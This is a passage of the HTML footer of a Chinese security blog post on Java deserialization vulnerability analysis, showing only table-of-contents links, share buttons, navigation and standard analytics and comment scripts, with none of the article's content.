class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%89%A9%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">五、扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84-java-%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">常见能能执行命令的 java 类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">五、参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&text=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&is_video=false&description=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java代码审计(八)-反序列化漏洞案例调试分析&body=Check out this article: http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&name=Java代码审计(八)-反序列化漏洞案例调试分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&t=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2022-2025
        Funsiooo
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a href="/search/">搜索</a></li><!--
        --><!--
          --><li><a href="/tags/">标签</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        -->
          </ul>
        </nav>        
      </div>

      <div class="footer-midle">
        <nav>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
              <span id="busuanzi_container_page_pv">
			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	      </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'boom';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

<!-- FancyBox -->

<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>


</body>
</html>
